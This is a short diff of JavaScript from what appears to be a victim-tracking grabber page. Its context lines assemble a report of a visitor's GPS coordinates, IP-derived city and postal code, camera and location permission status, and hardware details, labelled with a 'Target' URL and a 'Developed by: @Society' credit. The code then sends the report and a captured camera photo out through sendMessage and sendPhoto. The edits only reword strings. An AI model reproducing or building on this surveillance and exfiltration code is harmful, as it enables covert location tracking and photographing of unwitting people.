@@ -221,7 +221,7 @@
         if (gps) {
             message += `   • GPS Coordinates: ${gps.lat}, ${gps.lng}\n   • Accuracy: ±${gps.accuracy} meters\n   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
         } else {
-            message += `   • GPS: No disponible (permiso denegado o error)\n`;
+            message += `   • GPS: Permiso denegado o no disponible\n`;
             if (ipInfo.city !== 'N/A') {
                 message += `   • IP approximate location:\n   • Country: ${ipInfo.country}\n   • Region: ${ipInfo.region}\n   • City: ${ipInfo.city}\n   • Postal Code: ${ipInfo.postal}\n   • Timezone: ${ipInfo.timezone}\n`;
                 message += `   • Map: https://www.google.com/maps?q=${ipInfo.city},${ipInfo.country}\n`;
@@ -232,7 +232,7 @@
         message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n\n`;
         message += `🔐 *Device Permissions*\n   • Camera: ${foto ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n\n`;
         message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
-        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @Society👨🏻‍💻\n`;
+        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @Society\n`;
 
         await sendMessage(message);
         if (foto) await sendPhoto(foto);
